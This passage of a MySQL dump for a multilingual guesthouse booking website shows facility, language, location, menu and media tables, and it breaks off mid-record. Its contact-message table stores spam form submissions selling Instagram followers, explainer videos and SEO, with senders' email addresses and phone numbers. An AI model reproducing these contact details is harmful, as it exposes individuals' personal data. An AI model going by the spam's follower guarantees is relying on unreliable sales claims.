(27, 1, 'Telephone', NULL),
(27, 2, '電話', NULL),
(27, 3, '', NULL),
(27, 5, '電話', NULL),
(28, 1, 'Téléviseur', NULL),
(28, 2, '電視', NULL),
(28, 3, '', NULL),
(28, 5, '電視', NULL),
(29, 1, 'Terrasse', NULL),
(29, 2, '陽台', NULL),
(29, 3, '', NULL),
(29, 5, '陽台', NULL),
(30, 1, 'Machine à laver', NULL),
(30, 2, '洗衣機', NULL),
(30, 3, '', NULL),
(30, 5, '洗衣機', NULL),
(31, 1, 'Accès handicapés', NULL),
(31, 2, '無障礙使用', NULL),
(31, 3, '', NULL),
(31, 5, '無障礙使用', NULL),
(32, 1, 'Wi-Fi', NULL),
(32, 2, '無線網路', NULL),
(32, 3, '', NULL),
(32, 5, '無線網路', NULL),
(33, 1, 'Chaine hifi', 32),
(33, 2, 'Hi-fi system', 32),
(33, 5, 'Hi-fi system', 32),
(35, 1, 'Ascenceur', NULL),
(35, 2, '電梯', NULL),
(35, 3, '', NULL),
(35, 5, '電梯', NULL),
(36, 1, 'Coin salon', NULL),
(36, 2, 'Lounge', NULL),
(36, 3, '', NULL),
(36, 5, 'Lounge', NULL),
(37, 1, 'Restaurant', NULL),
(37, 2, '餐廳', NULL),
(37, 3, '', NULL),
(37, 5, '餐廳', NULL),
(38, 1, 'Service de chambre', NULL),
(38, 2, '客房服務', NULL),
(38, 3, '', NULL),
(38, 5, '客房服務', NULL);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_facility_file`
--

CREATE TABLE `pm_facility_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_facility_file`
--

INSERT INTO `pm_facility_file` (`id`, `lang`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(1, 1, 31, 0, 1, 1, 'wheelchair.png', '', 'image'),
(1, 2, 31, 0, 1, 1, 'wheelchair.png', '', 'image'),
(1, 5, 31, 0, 1, 1, 'wheelchair.png', '', 'image'),
(2, 1, 20, 0, 1, 2, 'pet-allowed.png', '', 'image'),
(2, 2, 20, 0, 1, 2, 'pet-allowed.png', '', 'image'),
(2, 5, 20, 0, 1, 2, 'pet-allowed.png', '', 'image'),
(3, 1, 21, 0, 1, 3, 'pet-not-allowed.png', '', 'image'),
(3, 2, 21, 0, 1, 3, 'pet-not-allowed.png', '', 'image'),
(3, 5, 21, 0, 1, 3, 'pet-not-allowed.png', '', 'image'),
(4, 1, 3, 0, 1, 4, 'balcony.png', '', 'image'),
(4, 2, 3, 0, 1, 4, 'balcony.png', '', 'image'),
(4, 5, 3, 0, 1, 4, 'balcony.png', '', 'image'),
(6, 1, 8, 0, 1, 6, 'desk.png', '', 'image'),
(6, 2, 8, 0, 1, 6, 'desk.png', '', 'image'),
(6, 5, 8, 0, 1, 6, 'desk.png', '', 'image'),
(7, 1, 6, 0, 1, 7, 'coffee.png', '', 'image'),
(7, 2, 6, 0, 1, 7, 'coffee.png', '', 'image'),
(7, 5, 6, 0, 1, 7, 'coffee.png', '', 'image'),
(8, 1, 24, 0, 1, 8, 'satellite.png', '', 'image'),
(8, 2, 24, 0, 1, 8, 'satellite.png', '', 'image'),
(8, 5, 24, 0, 1, 8, 'satellite.png', '', 'image'),
(9, 1, 1, 0, 1, 9, 'air-conditioning.png', '', 'image'),
(9, 2, 1, 0, 1, 9, 'air-conditioning.png', '', 'image'),
(9, 5, 1, 0, 1, 9, 'air-conditioning.png', '', 'image'),
(12, 1, 15, 0, 1, 12, 'iron.png', '', 'image'),
(12, 2, 15, 0, 1, 12, 'iron.png', '', 'image'),
(12, 5, 15, 0, 1, 12, 'iron.png', '', 'image'),
(13, 1, 14, 0, 1, 13, 'adsl.png', '', 'image'),
(13, 2, 14, 0, 1, 13, 'adsl.png', '', 'image'),
(13, 5, 14, 0, 1, 13, 'adsl.png', '', 'image'),
(15, 1, 2, 0, 1, 15, 'baby-cot.png', '', 'image'),
(15, 2, 2, 0, 1, 15, 'baby-cot.png', '', 'image'),
(15, 5, 2, 0, 1, 15, 'baby-cot.png', '', 'image'),
(16, 1, 30, 0, 1, 16, 'washing-machine.png', '', 'image'),
(16, 2, 30, 0, 1, 16, 'washing-machine.png', '', 'image'),
(16, 5, 30, 0, 1, 16, 'washing-machine.png', '', 'image'),
(17, 1, 16, 0, 1, 17, 'microwaves.png', '', 'image'),
(17, 2, 16, 0, 1, 17, 'microwaves.png', '', 'image'),
(17, 5, 16, 0, 1, 17, 'microwaves.png', '', 'image'),
(19, 1, 18, 0, 1, 19, 'non-smoking.png', '', 'image'),
(19, 2, 18, 0, 1, 19, 'non-smoking.png', '', 'image'),
(19, 5, 18, 0, 1, 19, 'non-smoking.png', '', 'image'),
(20, 1, 11, 0, 1, 20, 'free-parking.png', '', 'image'),
(20, 2, 11, 0, 1, 20, 'free-parking.png', '', 'image'),
(20, 5, 11, 0, 1, 20, 'free-parking.png', '', 'image'),
(21, 1, 19, 0, 1, 21, 'paid-parking.png', '', 'image'),
(21, 2, 19, 0, 1, 21, 'paid-parking.png', '', 'image'),
(21, 5, 19, 0, 1, 21, 'paid-parking.png', '', 'image'),
(22, 1, 7, 0, 1, 22, 'cooktop.png', '', 'image'),
(22, 2, 7, 0, 1, 22, 'cooktop.png', '', 'image'),
(22, 5, 7, 0, 1, 22, 'cooktop.png', '', 'image'),
(23, 1, 22, 0, 1, 23, 'radio.png', '', 'image'),
(23, 2, 22, 0, 1, 23, 'radio.png', '', 'image'),
(23, 5, 22, 0, 1, 23, 'radio.png', '', 'image'),
(24, 1, 12, 0, 1, 24, 'fridge.png', '', 'image'),
(24, 2, 12, 0, 1, 24, 'fridge.png', '', 'image'),
(24, 5, 12, 0, 1, 24, 'fridge.png', '', 'image'),
(25, 1, 25, 0, 1, 25, 'shower.png', '', 'image'),
(25, 2, 25, 0, 1, 25, 'shower.png', '', 'image'),
(25, 5, 25, 0, 1, 25, 'shower.png', '', 'image'),
(26, 1, 5, 0, 1, 26, 'bath.png', '', 'image'),
(26, 2, 5, 0, 1, 26, 'bath.png', '', 'image'),
(26, 5, 5, 0, 1, 26, 'bath.png', '', 'image'),
(27, 1, 13, 0, 1, 27, 'hairdryer.png', '', 'image'),
(27, 2, 13, 0, 1, 27, 'hairdryer.png', '', 'image'),
(27, 5, 13, 0, 1, 27, 'hairdryer.png', '', 'image'),
(28, 1, 27, 0, 1, 28, 'phone.png', '', 'image'),
(28, 2, 27, 0, 1, 28, 'phone.png', '', 'image'),
(28, 5, 27, 0, 1, 28, 'phone.png', '', 'image'),
(29, 1, 28, 0, 1, 29, 'tv.png', '', 'image'),
(29, 2, 28, 0, 1, 29, 'tv.png', '', 'image'),
(29, 5, 28, 0, 1, 29, 'tv.png', '', 'image'),
(30, 1, 29, 0, 1, 30, 'terrasse.png', '', 'image'),
(30, 2, 29, 0, 1, 30, 'terrasse.png', '', 'image'),
(30, 5, 29, 0, 1, 30, 'terrasse.png', '', 'image'),
(31, 1, 10, 0, 1, 31, 'fan.png', '', 'image'),
(31, 2, 10, 0, 1, 31, 'fan.png', '', 'image'),
(31, 5, 10, 0, 1, 31, 'fan.png', '', 'image'),
(32, 1, 32, 0, 1, 32, 'wifi.png', '', 'image'),
(32, 2, 32, 0, 1, 32, 'wifi.png', '', 'image'),
(32, 5, 32, 0, 1, 32, 'wifi.png', '', 'image'),
(33, 1, 33, 0, 1, 33, 'hifi.png', '', 'image'),
(33, 2, 33, 0, 1, 33, 'hifi.png', '', 'image'),
(33, 5, 33, 0, 1, 33, 'hifi.png', '', 'image'),
(35, 1, 33, 0, 1, 33, 'elevator.png', '', 'image'),
(35, 2, 33, 0, 1, 33, 'elevator.png', '', 'image'),
(35, 5, 33, 0, 1, 33, 'elevator.png', '', 'image'),
(36, 1, 33, 0, 1, 33, 'lounge.png', '', 'image'),
(36, 2, 33, 0, 1, 33, 'lounge.png', '', 'image'),
(36, 5, 33, 0, 1, 33, 'lounge.png', '', 'image'),
(37, 1, 33, 0, 1, 33, 'restaurant.png', '', 'image'),
(37, 2, 33, 0, 1, 33, 'restaurant.png', '', 'image'),
(37, 5, 33, 0, 1, 33, 'restaurant.png', '', 'image'),
(38, 1, 33, 0, 1, 33, 'room-service.png', '', 'image'),
(38, 2, 33, 0, 1, 33, 'room-service.png', '', 'image'),
(38, 5, 33, 0, 1, 33, 'room-service.png', '', 'image'),
(39, 1, 33, 0, 1, 33, 'cloakroom.png', '', 'image'),
(39, 2, 33, 0, 1, 33, 'cloakroom.png', '', 'image'),
(39, 5, 33, 0, 1, 33, 'cloakroom.png', '', 'image'),
(40, 1, 36, NULL, 1, 34, '3398328-200.png', '', 'image'),
(40, 2, 36, NULL, 1, 34, '3398328-200.png', '', 'image'),
(40, 3, 36, NULL, 1, 34, '3398328-200.png', '', 'image'),
(40, 5, 36, NULL, 1, 34, '3398328-200.png', '', 'image'),
(41, 1, 37, NULL, 1, 35, '1996055.png', NULL, 'image'),
(41, 2, 37, NULL, 1, 35, '1996055.png', '', 'image'),
(41, 3, 37, NULL, 1, 35, '1996055.png', NULL, 'image'),
(41, 5, 37, NULL, 1, 35, '1996055.png', '', 'image'),
(42, 1, 38, NULL, 1, 36, '671700-200.png', NULL, 'image'),
(42, 2, 38, NULL, 1, 36, '671700-200.png', NULL, 'image'),
(42, 3, 38, NULL, 1, 36, '671700-200.png', NULL, 'image'),
(42, 5, 38, NULL, 1, 36, '671700-200.png', NULL, 'image'),
(43, 1, 35, NULL, 1, 37, 'screenshot-1.png', NULL, 'image'),
(43, 2, 35, NULL, 1, 37, 'screenshot-1.png', NULL, 'image'),
(43, 3, 35, NULL, 1, 37, 'screenshot-1.png', NULL, 'image'),
(43, 5, 35, NULL, 1, 37, 'screenshot-1.png', NULL, 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_ical_event`
--

CREATE TABLE `pm_ical_event` (
  `id` int(11) NOT NULL,
  `id_room` int(11) NOT NULL,
  `title` varchar(150) DEFAULT NULL,
  `sync_date` int(11) DEFAULT NULL,
  `from_date` int(11) DEFAULT NULL,
  `to_date` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_lang`
--

CREATE TABLE `pm_lang` (
  `id` int(11) NOT NULL,
  `title` varchar(20) DEFAULT NULL,
  `locale` varchar(20) DEFAULT NULL,
  `main` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0,
  `tag` varchar(20) DEFAULT NULL,
  `rtl` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_lang`
--

INSERT INTO `pm_lang` (`id`, `title`, `locale`, `main`, `checked`, `rank`, `tag`, `rtl`) VALUES
(1, 'Français', 'fr_FR', 0, 2, 2, 'fr', 0),
(2, 'English', 'en_GB', 1, 1, 1, 'en', 0),
(3, 'عربي', 'ar_MA', 0, 2, 3, 'ar', 1),
(5, '正體中文', 'zh_TW', 0, 2, 4, 'zh_TW', 0);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_lang_file`
--

CREATE TABLE `pm_lang_file` (
  `id` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_lang_file`
--

INSERT INTO `pm_lang_file` (`id`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(1, 1, 0, 1, 2, 'fr.png', '', 'image'),
(2, 2, 0, 1, 1, 'gb.png', '', 'image'),
(3, 3, 0, 1, 3, 'ar.png', '', 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_location`
--

CREATE TABLE `pm_location` (
  `id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `lat` double DEFAULT NULL,
  `lng` double DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `pages` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_location`
--

INSERT INTO `pm_location` (`id`, `name`, `address`, `lat`, `lng`, `checked`, `pages`) VALUES
(1, 'Big Ben', 'London SW1A 0AA', 51.500729, -0.124625, 2, '2'),
(2, '愛馨會館', '950台東市中興路一段110號', 22.768247838173256, 121.14530047784606, 1, '2');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_media`
--

CREATE TABLE `pm_media` (
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_media`
--

INSERT INTO `pm_media` (`id`) VALUES
(1),
(4),
(5),
(6),
(7),
(8),
(15),
(16),
(17),
(18),
(19),
(20);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_media_file`
--

CREATE TABLE `pm_media_file` (
  `id` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_media_file`
--

INSERT INTO `pm_media_file` (`id`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(1, 1, NULL, 1, 1, 'f15f7b57ab31c217f471c6712a2654e0-taipei-101.jpg', NULL, 'image'),
(4, 4, NULL, 1, 2, 's-35848214fix.jpg', NULL, 'image'),
(5, 5, NULL, 1, 3, 's-35848218.jpg', NULL, 'image'),
(6, 6, NULL, 1, 4, 's-35848219.jpg', NULL, 'image'),
(7, 7, NULL, 1, 5, 'microsoftteams-image-3.png', NULL, 'image'),
(14, 15, NULL, 1, 6, 'fix-3-1.jpg', NULL, 'image'),
(15, 16, NULL, 1, 7, 'fix-3-2.jpg', NULL, 'image'),
(16, 17, NULL, 1, 8, 'fix-3-3.jpg', NULL, 'image'),
(17, 18, NULL, 1, 9, '3-1.jpg', NULL, 'image'),
(18, 19, NULL, 1, 10, '3-2.jpg', NULL, 'image'),
(19, 20, NULL, 1, 11, '3-3.jpg', NULL, 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_menu`
--

CREATE TABLE `pm_menu` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `id_parent` int(11) DEFAULT NULL,
  `item_type` varchar(30) DEFAULT NULL,
  `id_item` int(11) DEFAULT NULL,
  `url` text DEFAULT NULL,
  `main` int(11) DEFAULT 1,
  `footer` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_menu`
--

INSERT INTO `pm_menu` (`id`, `lang`, `name`, `title`, `id_parent`, `item_type`, `id_item`, `url`, `main`, `footer`, `checked`, `rank`) VALUES
(1, 1, 'Accueil', 'Panda Resort, Hotel de luxe', NULL, 'page', 1, '', 1, 0, 1, 1),
(1, 2, '首頁', 'Home', NULL, 'page', 1, '', 1, 0, 1, 1),
(1, 3, 'ترحيب', 'هو سقطت الساحلية ذات, أن.', NULL, 'page', 1, '', 1, 0, 1, 1),
(1, 5, '首頁', 'Home', NULL, 'page', 1, '', 1, 0, 1, 1),
(2, 1, 'Contact', 'Contact', NULL, 'page', 2, '', 1, 0, 1, 2),
(2, 2, '聯絡我們', '聯絡我們', NULL, 'page', 2, '', 1, 0, 1, 2),
(2, 3, 'جهة الاتصال', 'جهة الاتصال', NULL, 'page', 2, '', 1, 0, 1, 2),
(2, 5, '聯絡我們', '聯絡我們', NULL, 'page', 2, '', 1, 0, 1, 2),
(3, 1, 'Mentions légales', 'Mentions légales', NULL, 'page', 3, '', 0, 1, 1, 4),
(3, 2, '法律聲明', '法律聲明', NULL, 'page', 3, '', 0, 1, 1, 4),
(3, 3, 'يذكر القانونية', 'يذكر القانونية', NULL, 'page', 3, '', 0, 1, 1, 4),
(3, 5, '法律聲明', '法律聲明', NULL, 'page', 3, '', 0, 1, 1, 4),
(4, 1, 'Plan du site', 'Plan du site', NULL, 'page', 4, '', 0, 1, 1, 5),
(4, 2, '網站地圖', '網站地圖', NULL, 'page', 4, '', 0, 1, 1, 5),
(4, 3, 'خريطة الموقع', 'خريطة الموقع', NULL, 'page', 4, '', 0, 1, 1, 5),
(4, 5, '網站地圖', '網站地圖', NULL, 'page', 4, '', 0, 1, 1, 5),
(5, 1, 'Hôtel', 'Hôtel', NULL, 'page', 2, '', 1, 0, 1, 3),
(5, 2, '會館介紹', '會館介紹', NULL, 'page', 5, '', 1, 0, 1, 3),
(5, 3, 'فندق', 'فندق', NULL, 'page', 2, '', 1, 0, 1, 3),
(5, 5, '會館介紹', '會館介紹', NULL, 'page', 5, '', 1, 0, 1, 3),
(7, 1, 'Galerie', 'Galerie', NULL, 'page', 7, '', 1, 0, 1, 6),
(7, 2, '畫廊賞析', '畫廊賞析', NULL, 'page', 7, '', 0, 0, 2, 6),
(7, 3, 'معرض الصور', 'معرض الصور', NULL, 'page', 7, '', 1, 0, 1, 6),
(7, 5, '畫廊賞析', '畫廊賞析', NULL, 'page', 7, '', 0, 0, 2, 6),
(9, 1, 'Chambres', 'Chambres', NULL, 'page', 9, '', 1, 0, 1, 7),
(9, 2, '客房介紹', '客房介紹', NULL, 'page', 9, '', 1, 0, 1, 7),
(9, 3, 'الغرف', 'الغرف', NULL, 'page', 9, '', 1, 0, 1, 7),
(9, 5, '客房介紹', '客房介紹', NULL, 'page', 9, '', 1, 0, 1, 7),
(10, 1, 'Réserver', 'Réserver', NULL, 'page', 10, '', 1, 0, 1, 8),
(10, 2, '線上訂房', '線上訂房', NULL, 'page', 10, '', 1, 0, 1, 8),
(10, 3, 'الحجز', 'الحجز', NULL, 'page', 10, '', 1, 0, 1, 8),
(10, 5, '線上訂房', '線上訂房', NULL, 'page', 10, '', 1, 0, 1, 8),
(16, 1, 'Activités', 'Activités', NULL, 'page', 16, '', 1, 0, 2, 9),
(16, 2, 'Activities', 'Activities', NULL, 'page', 16, '', 1, 0, 2, 9),
(16, 3, 'Activities', 'Activities', NULL, 'page', 16, '', 1, 0, 2, 9),
(16, 5, 'Activities', 'Activities', NULL, 'page', 16, '', 1, 0, 2, 9),
(17, 1, '', '', NULL, 'page', 18, '', 1, 0, 2, 10),
(17, 2, '關於會館', '關於會館', NULL, 'page', 19, '', 1, 0, 2, 10),
(17, 3, '', '', NULL, 'page', 18, '', 1, 0, 2, 10),
(17, 5, '關於會館', '關於會館', NULL, 'page', 19, '', 1, 0, 2, 10),
(20, 2, '旅遊資訊', '旅遊資訊', NULL, 'page', 19, '', 1, 0, 1, 11),
(20, 5, '旅遊資訊', '旅遊資訊', NULL, 'page', 19, '', 1, 0, 1, 11);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_message`
--

CREATE TABLE `pm_message` (
  `id` int(11) NOT NULL,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `name` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `address` longtext DEFAULT NULL,
  `phone` varchar(100) DEFAULT NULL,
  `subject` varchar(250) DEFAULT NULL,
  `msg` longtext DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_message`
--

INSERT INTO `pm_message` (`id`, `add_date`, `edit_date`, `name`, `email`, `address`, `phone`, `subject`, `msg`) VALUES
(1, 1668748083, NULL, 'Angela', 'angelaballj774@yahoo.com', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- Guaranteed: We guarantee to gain you 400-1200+ followers per month.\r\n- Real, human followers: People follow you because they are interested in your business or niche.\r\n- Safe: All actions are made manually. We do not use any bots.\r\n\r\nThe price is just $60 per month, and we can start immediately.\r\n\r\nIf you are interested, and would like to see some of our previous work, let me know and we can discuss further.\r\n\r\nKind Regards,\r\nAngela', '079 2229 5954', 'Instagram Promotion: Grow your followers by 400-1200 each month', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- We guarantee to gain you 400-1000+ followers per month.\r\n- People follow you because they are interested in you, increasing likes, comments and interaction.\r\n- All actions are made manually by our team. We do not use any \'bots\'.\r\n\r\nThe price is just 60 USD per month, and we can start immediately.\r\n\r\nIf you\'d like to see some of our previous work, let me know, and we can discuss it further.\r\n\r\nKind Regards,\r\nAngela'),
(2, 1669321178, NULL, 'Kate', 'katytrilly9@gmail.com', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=bWz-ELfJVEI\r\nhttps://www.youtube.com/watch?v=Y46aNG-Y3rM\r\nhttps://www.youtube.com/watch?v=hJCFX1AjHKk\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $259\r\n1-2 minutes = $379\r\n2-3 minutes = $489\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKate', '(95) 3248-8399', 'Explainer Video for ising.goh.org.tw?', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=bWz-ELfJVEI\r\nhttps://www.youtube.com/watch?v=Y46aNG-Y3rM\r\nhttps://www.youtube.com/watch?v=hJCFX1AjHKk\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $259\r\n1-2 minutes = $379\r\n2-3 minutes = $489\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKate'),
(3, 1673670219, NULL, 'Christoper', 'seosubmitter@mail.com', 'You need help to Grow In Google Search and Drive More Traffic and Get More Customers\r\n\r\nWe Offer Quality SEO Services You Can Trust\r\n\r\nWe even offer Free Trial just to prove to you that our services work with Risk-Free.\r\n\r\n=>>  https://zeep.ly/seo2023\r\n \r\nThanks, \r\nConder\r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n\r\n\r\n\r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\nSwitzerland, NA, Gachnang, 8547, Via Schliffras 31\r\n \r\nTo stop any further communication through your website form, Please reply with subject: unsubscribe goh.org.tw', '052 498 17 33', 'You Need Help To Grow In Google Search', 'You need help to Grow In Google Search and Drive More Traffic and Get More Customers\r\n\r\nWe Offer Quality SEO Services You Can Trust\r\n\r\nWe even offer Free Trial just to prove to you that our services work with Risk-Free.\r\n\r\n=>>  https://zeep.ly/seo2023\r\n \r\nThanks, \r\nConder\r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n\r\n\r\n\r\n \r\n \r\n \r\n  \r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\nSwitzerland, NA, Gachnang, 8547, Via Schliffras 31\r\n \r\nTo stop any further communication through your website form, Please reply with subject: unsubscribe goh.org.tw'),
(4, 1673733186, NULL, 'Christina', 'christinahendersones6@gmail.com', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- We guarantee to gain you 400-1000+ followers per month.\r\n- People follow you because they are interested in you, increasing likes, comments and interaction.\r\n- All actions are made manually by our team. We do not use any \'bots\'.\r\n\r\nThe price is just $60 (USD) per month, and we can start immediately.\r\n\r\nIf you\'d like to see some of our previous work, let me know, and we can discuss it further.\r\n\r\nKind Regards,\r\nChristina', '', 'Instagram Promotion: 400-1200 new followers each month', 'Hi there,\r\n\r\nWe run an Instagram growth service, which increases your number of followers both safely and practically. \r\n\r\n- We guarantee to gain you 400-1000+ followers per month.\r\n- People follow you because they are interested in you, increasing likes, comments and interaction.\r\n- All actions are made manually by our team. We do not use any \'bots\'.\r\n\r\nThe price is just $60 (USD) per month, and we can start immediately.\r\n\r\nIf you\'d like to see some of our previous work, let me know, and we can discuss it further.\r\n\r\nKind Regards,\r\nChristina'),
(5, 1674957835, NULL, 'Kellie', 'kelliesohm@gmail.com', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=bWz-ELfJVEI\r\nhttps://www.youtube.com/watch?v=Y46aNG-Y3rM\r\nhttps://www.youtube.com/watch?v=hJCFX1AjHKk\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $259\r\n1-2 minutes = $379\r\n2-3 minutes = $489\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKellie', '967 60 383', 'Explainer Video for ising.goh.org.tw?', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=zvGF7uRfH04\r\nhttps://www.youtube.com/watch?v=cZPsp217Iik\r\nhttps://www.youtube.com/watch?v=JHfnqS2zpU8\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $239\r\n1-2 minutes = $339\r\n2-3 minutes = $439\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKellie'),
(6, 1675461598, NULL, 'Kellie', 'kelliesohm@gmail.com', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=zvGF7uRfH04\r\nhttps://www.youtube.com/watch?v=cZPsp217Iik\r\nhttps://www.youtube.com/watch?v=JHfnqS2zpU8\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $239\r\n1-2 minutes = $339\r\n2-3 minutes = $439\r\n\r\n*All prices above are in USD and include a full script, voice-over and video.\r\n\r\nIf this is something you would like to discuss further, don\'t hesitate to reply.\r\n\r\nKind Regards,\r\nKellie', '07457 46 09 65', 'Explainer Videos for ising.goh.org.tw', 'Hi,\r\n\r\nWe\'d like to introduce to you our explainer video service, which we feel can benefit your site ising.goh.org.tw.\r\n\r\nCheck out some of our existing videos here:\r\nhttps://www.youtube.com/watch?v=bWz-ELfJVEI\r\nhttps://www.youtube.com/watch?v=Y46aNG-Y3rM\r\nhttps://www.youtube.com/watch?v=hJCFX1AjHKk\r\n\r\nAll of our videos are in a similar animated format as the above examples, and we have voice over artists with US/UK/Australian accents.\r\nWe can also produce voice overs in languages other than English.\r\n\r\nThey can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video sites such as YouTube, and can be embedded into your website or featured on landing pages.\r\n\r\nOur prices are as follows depending on video length:\r\nUp to 1 minute = $259\r\n1-2 minutes = $379\r\n2-3 minutes = 